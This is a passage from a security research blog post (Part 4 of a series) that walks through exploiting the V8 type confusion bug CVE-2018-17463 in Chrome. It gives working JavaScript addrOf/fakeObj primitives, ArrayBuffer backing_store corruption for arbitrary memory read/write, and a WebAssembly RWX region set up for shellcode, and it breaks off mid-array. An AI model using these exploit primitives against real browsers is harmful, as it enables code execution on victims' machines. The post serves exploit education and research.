                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-addrcard"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/author/">
                <i class="iconfont icon-user-fill"></i>
                Author
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax="true" style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              
  <div class="mt-3 post-meta">
    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
    <time datetime="2025-10-10 17:00" pubdate>
      2025년 10월 10일 오후
    </time>
  </div>


<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      5.1k 자
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      102
       분
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2">
      <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
    </div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">[Research] Starting Chrome Exploitation with Type Confusion 101 ^-^☆ Part 4.(EN)</h1>
                       
            <div class="markdown-body" id="post-body">
              <!-- <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
              <!-- hackyboiz_horizen_index -->
              <!--
              <ins class="adsbygoogle"
                   style="display:block"
                   data-ad-client="ca-pub-3672652207808168"
                   data-ad-slot="8887862313"
                   data-ad-format="auto"
                   data-full-width-responsive="true"></ins>
              <script>
                   (adsbygoogle = window.adsbygoogle || []).push({});
              </script>
              -->
              <p>Hello, OUYA77 here!</p>
<p>Last time I failed to manage the post length and stopped after obtaining only the Read/Write primitives; this time I&#x2019;ll go all the way to RCE. So in this post I&#x2019;ll cover the remaining exploit details from CVE-2018-17463 and talk about the Heap Sandbox.</p>
<blockquote>
<p>See previous posts<br>&#x2192; <a href="https://hackyboiz.github.io/2025/07/01/OUYA77/Chrome_part1/en/">Starting Chrome Exploitation with Type Confusion 101 ^-^&#x2606; Part 1.</a><br>&#x2192; <a href="https://hackyboiz.github.io/2025/07/30/OUYA77/Chrome_part2/en/">Starting Chrome Exploitation with Type Confusion 101 ^-^&#x2606; Part 2.</a><br>&#x2192; <a href="https://hackyboiz.github.io/2025/09/26/OUYA77/Chrome_part3/en/">Starting Chrome Exploitation with Type Confusion 101 ^-^&#x2606; Part 3.</a></p>
</blockquote>
<h2 id="0-Recap"><a href="#0-Recap" class="headerlink" title="0. Recap"></a>0. Recap</h2><p>In Part 3 we used type confusion to find overlapping property pairs. Because an object pointer was interpreted as a double, by reading/writing the double field we were able to obtain Read/Write primitives from the pointer value being corrupted.</p>
<ul>
<li>The addrOf Read Primitive</li>
</ul>
<pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addrOf</span>(<span class="hljs-params"></span>) </span>{
    <span class="hljs-comment">// 1. Dynamically create the vuln function (bypass Map checks)</span>
    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span>
<span class="hljs-string">    function vuln(obj) {</span>
<span class="hljs-string">      obj.inline;</span>
<span class="hljs-string">      this.Object.create(obj);</span>
<span class="hljs-string">      // We expect p1 to be a Double, but the actual loaded value is</span>
<span class="hljs-string">      // an Object pointer (p2)</span>
<span class="hljs-string">      return obj.p<span class="hljs-subst">${p1}</span>.x; </span>
<span class="hljs-string">    }</span>
<span class="hljs-string">  `</span>);

    <span class="hljs-keyword">let</span> obj = {<span class="hljs-attr">z</span>: <span class="hljs-number">1234</span>}; <span class="hljs-comment">// target object whose address we want to know</span>
    <span class="hljs-keyword">let</span> pValues = [];
    pValues[p1] = {<span class="hljs-attr">x</span>: <span class="hljs-number">13.37</span>}; <span class="hljs-comment">// Double (expected type)</span>
    pValues[p2] = {<span class="hljs-attr">y</span>: obj}; <span class="hljs-comment">// Object (actual loaded value)</span>

    <span class="hljs-comment">// 2. Trigger JIT optimization and induce Type Confusion</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));
        <span class="hljs-comment">// If the return value is not 13.37 (i.e., an address leaked), success</span>
        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {
            <span class="hljs-keyword">return</span> res.toBigInt() - <span class="hljs-number">1n</span>; <span class="hljs-comment">// return address with tag removed</span>
        }
    }
    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] AddrOf Primitive Failed&quot;</span>
}</code></pre>
<ul>
<li>The fakeObj Write Primitive</li>
</ul>
<pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeObj</span>(<span class="hljs-params"></span>) </span>{
    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span>
<span class="hljs-string">    function vuln(obj) {</span>
<span class="hljs-string">      obj.inline;</span>
<span class="hljs-string">      this.Object.create(obj);</span>
<span class="hljs-string">      let orig = obj.p<span class="hljs-subst">${p1}</span>.x;</span>
<span class="hljs-string">      // Overwrite property x of p1, but due to type confusion</span>
<span class="hljs-string">      // we overwrite property y of p2</span>
<span class="hljs-string">      obj.p<span class="hljs-subst">${p1}</span>.x = 0x41414141n;</span>
<span class="hljs-string">      return orig;</span>
<span class="hljs-string">    }</span>
<span class="hljs-string">  `</span>);

    <span class="hljs-keyword">let</span> obj = {<span class="hljs-attr">z</span>: <span class="hljs-number">1234</span>};
    <span class="hljs-keyword">let</span> pValues = [];
    pValues[p1] = {<span class="hljs-attr">x</span>: <span class="hljs-number">13.37</span>};
    pValues[p2] = {<span class="hljs-attr">y</span>: obj};

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));
        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {
            <span class="hljs-keyword">return</span> res;
        }
    }
}</code></pre>
<p>Now that we have a read primitive that can leak addresses and a write primitive that can write to object addresses, we&#x2019;ll refine these into arbitrary memory read/write (AAR/AAW) primitives for the exploit and drive toward RCE.</p>
<h1 id="1-CVE-2018-17463-cont&#x2019;d-For-RCE"><a href="#1-CVE-2018-17463-cont&#x2019;d-For-RCE" class="headerlink" title="1. CVE-2018-17463 (cont&#x2019;d) - For RCE"></a>1. CVE-2018-17463 (cont&#x2019;d) - For RCE</h1><h2 id="1-1-Relative-R-W-&#x2192;-AAR-W"><a href="#1-1-Relative-R-W-&#x2192;-AAR-W" class="headerlink" title="1.1 Relative R/W &#x2192; AAR/W"></a>1.1 Relative R/W &#x2192; AAR/W</h2><h3 id="Concept"><a href="#Concept" class="headerlink" title="Concept)"></a>Concept)</h3><p>The current read/write primitives let us overwrite property values(pointers) inside other JavaScript objects, but that alone isn&#x2019;t useful for reading/writing arbitrary memory addresses directly.</p>
<p>The problem stems from <strong>how V8 manages objects</strong>. Even if we overwrite a memory slot with a value that looks like an address (e.g., <code>0x41414141</code>), V8 will still treat that value as a <strong>valid JavaScript object pointer</strong>. So if we write the address where we want to put shellcode into an object pointer slot, V8 will dereference that pointer expecting a real object layout and then try to access its internal fields (for example, the <code>backing store</code> pointer at offset 8). Because the memory at that address likely does not contain the expected object layout, V8 will crash or the manipulation will fail.</p>
<p>To get true arbitrary-address read/write(AAR/AAW) we must overwrite an <strong>internal field that V8 actually uses as a raw memory pointer</strong>, not a JavaScript object pointer. A commonly used target is the <code>backing_store</code> pointer of an <code>ArrayBuffer</code>. An <code>ArrayBuffer</code> represents a fixed-length block of binary data; one of its internal fields is a pointer to the actual memory that stores the bytes &#x2014; the <code>backing_store</code>.</p>
<p>Because typed arrays (<code>TypedArray</code>, <code>DataView</code>, etc.) read and write through that <code>backing_store</code> pointer, controlling it effectively gives us control of what memory a typed-view reads/writes. Crucially, V8 treats the <code>backing_store</code> as a raw buffer address rather than validating it as a JavaScript object pointer, so overwriting it lets us point an <code>ArrayBuffer</code> at arbitrary memory.</p>
<p>Note: you cannot directly read/write data from an <code>ArrayBuffer</code> without a view &#x2014; you must access it via a <code>TypedArray</code> or <code>DataView</code> using the desired format (float, 64-bit integer, etc.). The exploitation flow becomes: use the limited Relative R/W primitive to overwrite an <code>ArrayBuffer</code>&#x2018;s <code>backing_store</code> pointer, then use a <code>TypedArray/DataView</code> on that buffer to read/write arbitrary memory.</p>
<h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation)"></a>Exploitation)</h3><p>Let&#x2019;s see how to implement that concept with the <code>fakeObj</code> primitive we already used.</p>
<pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeObj</span>(<span class="hljs-params"></span>) </span>{
    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span>
<span class="hljs-string">    function vuln(obj) {</span>
<span class="hljs-string">      obj.inline;</span>
<span class="hljs-string">      this.Object.create(obj);</span>
<span class="hljs-string">      let orig = obj.p<span class="hljs-subst">${p1}</span>.x;</span>
<span class="hljs-string">      // Overwrite property x of p1, but due to type confusion</span>
<span class="hljs-string">      // we overwrite property y of p2</span>
<span class="hljs-string">      obj.p<span class="hljs-subst">${p1}</span>.x = 0x41414141n;</span>
<span class="hljs-string">      return orig;</span>
<span class="hljs-string">    }</span>
<span class="hljs-string">  `</span>);

    <span class="hljs-keyword">let</span> obj = {<span class="hljs-attr">z</span>: <span class="hljs-number">1234</span>};
    <span class="hljs-keyword">let</span> pValues = [];
    pValues[p1] = {<span class="hljs-attr">x</span>: <span class="hljs-number">13.37</span>};
    pValues[p2] = {<span class="hljs-attr">y</span>: obj}
    ...</code></pre>
<p>With <code>fakeObj</code> we can overwrite certain inline properties that overlap with other objects&#x2019; inline fields. In the <code>vuln</code> function we attempt to write <code>p1.x</code>, but due to type confusion that write actually targets <code>p2</code>&#x2018;s inline slot. That allows us to overwrite an object&#x2019;s stored pointer value.</p>
<p>The diagrams below illustrate the overlap. The <code>ArrayBuffer</code> backing_store pointer sits at offset 32, so if we create an object with two inline properties (e.g., <code>x1</code> and <code>x2</code>) where <code>x2</code> overlaps that backing_store slot, we can use the <code>fakeObj</code> write to target the backing_store pointer.</p>
<p><img src="image.png" srcset="/img/loading.gif" alt="ref: [https://jhalon.github.io/chrome-browser-exploitation-3/](https://jhalon.github.io/chrome-browser-exploitation-3/)"></p>
<p>ref: <a target="_blank" rel="external nofollow noopener noreferrer" href="https://jhalon.github.io/chrome-browser-exploitation-3/">https://jhalon.github.io/chrome-browser-exploitation-3/</a></p>
<p>ArrayBuffer backing_store is at offset 32; by adding another inline property <code>x2</code> we can reach and overwrite that pointer via our primitive.</p>
<p><img src="image%201.png" srcset="/img/loading.gif" alt="image.png"></p>
<p>Using one overwritten ArrayBuffer is useful, but repeatedly triggering the bug to change the backing_store each time you want to read/write many addresses is tedious. A more practical trick uses <strong>two ArrayBuffers</strong>:</p>
<ol>
<li>Corrupt the backing_store pointer of the first ArrayBuffer so it points to the second ArrayBuffer object.</li>
<li>Use a <code>TypedArray</code> view on the first buffer to write into a specific property index which, because we pointed it at the second buffer, will overwrite the second buffer&#x2019;s backing_store pointer.</li>
<li>Now the second buffer&#x2019;s backing_store points at an attacker-controlled address. Using a <code>TypedArray</code> view on the second buffer lets you read/write that memory directly.</li>
</ol>
<p>This two-buffer technique lets you rapidly read/write arbitrary heap addresses without retriggering the vulnerability for every access. Diagram showing the two-buffer trick:</p>
<p><img src="image%202.png" srcset="/img/loading.gif" alt="image.png"></p>
<h3 id="Coding"><a href="#Coding" class="headerlink" title="Coding)"></a>Coding)</h3><p>We previously hard-coded the overwritten value. Now we make the primitive accept a parameter for the new value, and we change <code>p1</code> to have <strong>two inline properties</strong>, because the second inline property overlaps with the ArrayBuffer <code>backing_store</code>. So the <code>vuln</code> function must write to the second inline property to overwrite the backing_store pointer.</p>
<p>Also add a <code>toNumber</code> helper to convert <code>BigInt</code> addresses into the floating representation used in the type-confused slot (because our type confusion returns a float, we need to convert addresses into float bit patterns).</p>
<p>Final <code>fakeObj</code> primitive:</p>
<pre><code class="hljs jsx">BigInt.prototype.toNumber = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toNumber</span>(<span class="hljs-params"></span>) </span>{
    uint64View[<span class="hljs-number">0</span>] = <span class="hljs-built_in">this</span>;
    <span class="hljs-keyword">return</span> floatView[<span class="hljs-number">0</span>];
};

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeObj</span>(<span class="hljs-params">obj, newValue</span>) </span>{
    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span>
<span class="hljs-string">    function vuln(obj) {</span>
<span class="hljs-string">      obj.inline;</span>
<span class="hljs-string">      this.Object.create(obj);</span>
<span class="hljs-string">      // Write to Backing Store Pointer via Property x2</span>
<span class="hljs-string">      let orig = obj.p<span class="hljs-subst">${p1}</span>.x2;</span>
<span class="hljs-string">      obj.p<span class="hljs-subst">${p1}</span>.x2 = <span class="hljs-subst">${newValue.toNumber()}</span>;</span>
<span class="hljs-string">      return orig;</span>
<span class="hljs-string">    }</span>
<span class="hljs-string">  `</span>);

    <span class="hljs-keyword">let</span> pValues = [];
    <span class="hljs-comment">// x2 Property Overlaps Backing Store Pointer for Array Buffer</span>
    <span class="hljs-keyword">let</span> o = {<span class="hljs-attr">x1</span>: <span class="hljs-number">13.37</span>, <span class="hljs-attr">x2</span>: <span class="hljs-number">13.38</span>};
    pValues[p1] = o;
    pValues[p2] = obj;

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
        <span class="hljs-comment">// Force Map Check and Redundancy Elimination</span>
        o.x2 = <span class="hljs-number">13.38</span>;
        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));
        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.38</span>) {
            <span class="hljs-keyword">return</span> res.toBigInt();
        }
    }
    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] fakeObj Primitive Failed&quot;</span>
}
</code></pre>
<p>We must also update the <code>addrOf</code> primitive in the same way (use <code>x2</code>):</p>
<pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addrOf</span>(<span class="hljs-params">obj</span>) </span>{
    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span>
<span class="hljs-string">    function vuln(obj) {</span>
<span class="hljs-string">      obj.inline;</span>
<span class="hljs-string">      this.Object.create(obj);</span>
<span class="hljs-string">      // Trigger our type-confusion by accessing an out-of-bound property</span>
<span class="hljs-string">      // This will load p1 from our object thinking it&apos;s a Double, but instead</span>
<span class="hljs-string">      // due to overlap, it will load p2 which is an Object</span>
<span class="hljs-string">      return obj.p<span class="hljs-subst">${p1}</span>.x2;</span>
<span class="hljs-string">    }</span>
<span class="hljs-string">  `</span>);

    <span class="hljs-keyword">let</span> pValues = [];
    <span class="hljs-comment">// x2 Property Overlaps Backing Store Pointer for Array Buffer</span>
    pValues[p1] = {<span class="hljs-attr">x1</span>: <span class="hljs-number">13.37</span>, <span class="hljs-attr">x2</span>: <span class="hljs-number">13.38</span>};
    pValues[p2] = {<span class="hljs-attr">y</span>: obj};

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));
        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {
            <span class="hljs-comment">// Subtract 1n from address due to pointer tagging.</span>
            <span class="hljs-keyword">return</span> res.toBigInt() - <span class="hljs-number">1n</span>;
        }
    }
    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] AddrOf Primitive Failed&quot;</span>
}
</code></pre>
<hr>
<p>Now that the exploit script is modified, we should be able to overwrite an ArrayBuffer&#x2019;s backing_store pointer. Let&#x2019;s test it: create a new 1024-byte ArrayBuffer, leak its address, then overwrite its backing_store with <code>0x41414141</code> and verify using <code>%DebugPrint</code> that the backing_store changed.</p>
<p>Append to the script:</p>
<pre><code class="hljs jsx">print(<span class="hljs-string">&quot;[+] Finding Overlapping Properties...&quot;</span>);
findOverlappingProperties();
print(<span class="hljs-string">`[+] Properties p<span class="hljs-subst">${p1}</span> and p<span class="hljs-subst">${p2}</span> overlap!`</span>);

<span class="hljs-comment">// Create Array Buffer</span>
<span class="hljs-keyword">let</span> arrBuf1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1024</span>);

print(<span class="hljs-string">&quot;[+] Leaking ArrayBuffer Address...&quot;</span>);
<span class="hljs-keyword">let</span> arrBuf1fAddr = addrOf(arrBuf1);
print(<span class="hljs-string">`[+] ArrayBuffer Address: 0x<span class="hljs-subst">${arrBuf1fAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);
%DebugPrint(arrBuf1)

print(<span class="hljs-string">&quot;[+] Corrupting ArrayBuffer Backing Store Address...&quot;</span>)
<span class="hljs-comment">// Overwrite Backing Store Pointer with 0x41414141</span>
<span class="hljs-keyword">let</span> ret = fakeObj(arrBuf1, <span class="hljs-number">0x41414141n</span>);
print(<span class="hljs-string">`[+] Original Leaked Data: 0x<span class="hljs-subst">${ret.toString(<span class="hljs-number">16</span>)}</span>`</span>);
%DebugPrint(arrBuf1)</code></pre>
<p>Example output:</p>
<pre><code class="hljs prolog">[+] <span class="hljs-symbol">Finding</span> <span class="hljs-symbol">Overlapping</span> <span class="hljs-symbol">Properties</span>...
[+] <span class="hljs-symbol">Properties</span> p15 and p11 overlap!
[+] <span class="hljs-symbol">Leaking</span> <span class="hljs-symbol">ArrayBuffer</span> <span class="hljs-symbol">Address</span>...
[+] <span class="hljs-symbol">ArrayBuffer</span> <span class="hljs-symbol">Address</span>: <span class="hljs-number">0x2a164919360</span>
...
[+] <span class="hljs-symbol">Corrupting</span> <span class="hljs-symbol">ArrayBuffer</span> <span class="hljs-symbol">Backing</span> <span class="hljs-symbol">Store</span> <span class="hljs-symbol">Address</span>...
[+] <span class="hljs-symbol">Original</span> <span class="hljs-symbol">Leaked</span> <span class="hljs-symbol">Data</span>: <span class="hljs-number">0x1aeda203210</span>
<span class="hljs-symbol">DebugPrint</span>: ...
 - backing_store: <span class="hljs-number">0000000041414141</span>
...
</code></pre>
<hr>
<p>Now that we can overwrite backing_store, use two ArrayBuffers to build AAR/AAW primitives:</p>
<pre><code class="hljs jsx"><span class="hljs-keyword">let</span> memory = {
    read64(addr) {
        view1[<span class="hljs-number">4</span>] = addr;
        <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);
        <span class="hljs-keyword">return</span> view2[<span class="hljs-number">0</span>];
    },
    write64(addr, ptr) {
        view1[<span class="hljs-number">4</span>] = addr;
        <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);
        view2[<span class="hljs-number">0</span>] = ptr;
    }
};</code></pre>
<p>Summary: using type confusion we first obtained relative R/W via overlapping properties; by corrupting <code>ArrayBuffer</code> backing_store and employing two buffers we convert that into arbitrary-address R/W. </p>
<p>Now let&#x2019;s run the code and get code execution!</p>
<h2 id="1-2-AAR-W-&#x2192;-RCE"><a href="#1-2-AAR-W-&#x2192;-RCE" class="headerlink" title="1.2 AAR/W &#x2192; RCE"></a>1.2 AAR/W &#x2192; RCE</h2><h3 id="Toward-Gaining-Code-Execution"><a href="#Toward-Gaining-Code-Execution" class="headerlink" title="Toward Gaining Code Execution"></a>Toward Gaining Code Execution</h3><p>Now that we have AAR/W, we need to execute code &#x2014; but unfortunately we can&#x2019;t just write shellcode into the V8 heap or an ArrayBuffer and run it, because DEP(Data Execution Prevention) is enabled. A common alternative is to target JIT memory.</p>
<p>When JavaScript code is JIT-compiled, the compiler writes machine instructions into memory pages that must be executed, so those pages are typically given RWX(Read-Write-Execute) permissions. An attacker can leak a pointer to a JIT-compiled function, overwrite the code at that address with shellcode, and then call the function to run the shellcode.</p>
<p><em>However</em>, since 2018 the V8 team added <code>write_protect_code_memory</code>. That protection flips JIT pages to RX (Read-Execute) at execution time and to RW(Read-Write) only when writing, so it&#x2019;s no longer feasible to treat JIT memory as permanently RWX. As with pwnable challenges, one workaround is to build a ROP(Return-Oriented Programming) chain: manipulate vtables, JIT function pointers, or the stack to achieve code execution. ROP construction is fairly involved, though, so instead we&#x2019;ll use a simpler and more reliable approach: <strong>WebAssembly(wasm)</strong>.</p>
<h3 id="WebAssembly-basics"><a href="#WebAssembly-basics" class="headerlink" title="WebAssembly basics"></a>WebAssembly basics</h3><p>WebAssembly is a binary format designed to run low-level code in the browser (often compiled from C/C++), and it interoperates with JavaScript.</p>
<p>V8 does not fully optimize wasm code immediately; it first uses a baseline compiler called <strong>Liftoff</strong> to produce machine code. Wasm also uses JIT memory, so machine code is placed in executable pages. Importantly, because of asm.js compatibility reasons, the write-protect flag for wasm was (at the time) typically disabled, which made wasm a very useful exploitation primitive.</p>
<p>When a wasm module is instantiated in V8, function calls go through a <strong>jump table</strong>. Each function slot in that table points to the actual machine code for the function (a <code>WasmCode</code> object). Those pointers reference executable memory, so an attacker who can overwrite them could hijack execution. (Back in 2018 the wasm jump table in the V8 heap was readable/writable/executable and thus easy to hijack &#x2014; modern V8 has hardened this, though &#x315C;.&#x315C;.)</p>
<h3 id="addrOf-function-re-building"><a href="#addrOf-function-re-building" class="headerlink" title="addrOf function re-building"></a>addrOf function re-building</h3><p>Using our read/write primitives we can leak the wasm instance object address and the RWX jump table pointer. However, the earlier <code>addrOf</code> primitive relied on overlapping properties (which can corrupt other functionality), so we need a safer approach.</p>
<p>We will build a new <code>addrOf</code> by adding an <strong>out-of-line property</strong> to an <code>ArrayBuffer</code>, referencing the target object there, and then reading the property storage metadata via our memory read primitive to leak the object pointer. This avoids overwriting inline object fields.</p>
<blockquote>
<p><strong>Why this works</strong>_<br><strong>**An <code>ArrayBuffer</code> manages raw bytes and, separately from inline properties, it has a </strong>property storage**(property backing store). If we assign an object to an out-of-line property (e.g., <code>arrBuf.leakMe = obj</code>), a pointer to the object is placed in that property storage. By using our arbitrary memory read primitive to inspect that property store&#x2019;s metadata, we can indirectly obtain the object pointer. In other words, we can leak an object&#x2019;s address without overwriting its fields.</p>
</blockquote>
<pre><code class="hljs jsx"><span class="hljs-keyword">let</span> memory = {
  addrOf(obj) {
    <span class="hljs-comment">// Set object address to new out-of-line property called leakme</span>
    arrBuf2.leakMe = obj;
    <span class="hljs-comment">// Use read64 primitive to leak the properties backing store address of our array buffer</span>
    <span class="hljs-keyword">let</span> props = <span class="hljs-built_in">this</span>.read64(arrBuf2Addr + <span class="hljs-number">8n</span>) - <span class="hljs-number">1n</span>;
    <span class="hljs-comment">// Read offset 16 from the array buffer backing store and return the address of our object</span>
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.read64(props + <span class="hljs-number">16n</span>) - <span class="hljs-number">1n</span>;
  }
};</code></pre>
<p>Using this technique we can finally leak the <code>wasmInstance</code> address and the RWX jump table pointer for that instance.</p>
<h2 id="1-3-RCE-PoC"><a href="#1-3-RCE-PoC" class="headerlink" title="1.3. RCE PoC"></a>1.3. RCE PoC</h2><p>Now let&#x2019;s combine everything we&#x2019;ve covered so far.</p>
<h3 id="1-Build-primitives"><a href="#1-Build-primitives" class="headerlink" title="[1] Build primitives"></a>[1] Build primitives</h3><p>Find the address of the second <code>ArrayBuffer</code> with <code>addrOf</code>, change the <code>backing_store</code> pointer of the first buffer to point to the second buffer&#x2019;s address, and then build memory read/write primitives from that.</p>
<pre><code class="hljs jsx"><span class="hljs-comment">// Create Array Buffers</span>
<span class="hljs-keyword">let</span> arrBuf1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1024</span>);
<span class="hljs-keyword">let</span> arrBuf2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1024</span>);

<span class="hljs-comment">// Leak Address of arrBuf2</span>
print(<span class="hljs-string">&quot;[+] Leaking ArrayBuffer Address...&quot;</span>);
<span class="hljs-keyword">let</span> arrBuf2Addr = addrOf(arrBuf2);
print(<span class="hljs-string">`[+] ArrayBuffer Address @ 0x<span class="hljs-subst">${arrBuf2Addr.toString(<span class="hljs-number">16</span>)}</span>`</span>);

<span class="hljs-comment">// Corrupt Backing Store Pointer of arrBuf1 with Address to arrBuf2</span>
print(<span class="hljs-string">&quot;[+] Corrupting ArrayBuffer Backing Store...&quot;</span>)
<span class="hljs-keyword">let</span> originalArrBuf1BackingStore = fakeObj(arrBuf1, arrBuf2Addr);

<span class="hljs-comment">// Store Original Backing Store Pointer of arrBuf2</span>
<span class="hljs-keyword">let</span> view1 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf1)
<span class="hljs-keyword">let</span> originalArrBuf2BackingStore = view1[<span class="hljs-number">4</span>]

<span class="hljs-comment">// Construct Memory Primitives via Array Buffers</span>
<span class="hljs-keyword">let</span> memory = {
  write(addr, bytes) {
    view1[<span class="hljs-number">4</span>] = addr;
    <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(arrBuf2);
    view2.set(bytes);
  },
  read64(addr) {
    view1[<span class="hljs-number">4</span>] = addr;
    <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);
    <span class="hljs-keyword">return</span> view2[<span class="hljs-number">0</span>];
  },
  write64(addr, ptr) {
    view1[<span class="hljs-number">4</span>] = addr;
    <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);
    view2[<span class="hljs-number">0</span>] = ptr;
  },
  addrOf(obj) {
    arrBuf2.leakMe = obj;
    <span class="hljs-keyword">let</span> props = <span class="hljs-built_in">this</span>.read64(arrBuf2Addr + <span class="hljs-number">8n</span>) - <span class="hljs-number">1n</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.read64(props + <span class="hljs-number">16n</span>) - <span class="hljs-number">1n</span>;
  }
};

print(<span class="hljs-string">&quot;[+] Constructed Memory Read and Write Primitive!&quot;</span>);</code></pre>
<h3 id="2-Create-a-WebAssembly-instance"><a href="#2-Create-a-WebAssembly-instance" class="headerlink" title="[2] Create a WebAssembly instance"></a>[2] Create a WebAssembly instance</h3><p>This wasm code block compiles a simple &#x201C;dummy function&#x201D; into JIT memory. When the instance is created, an internal <strong>RWX jump table</strong> is allocated. We can later overwrite that RWX memory with shellcode and execute it.</p>
<pre><code class="hljs jsx">print(<span class="hljs-string">&quot;[+] Generating a WebAssembly Instance...&quot;</span>);

<span class="hljs-comment">// Generate RWX region for Shellcode via WASM</span>
<span class="hljs-keyword">var</span> wasmCode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>([<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">133</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">127</span>,<span class="hljs-number">3</span>,<span class="hljs-number">130</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">112</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">131</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">129</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span 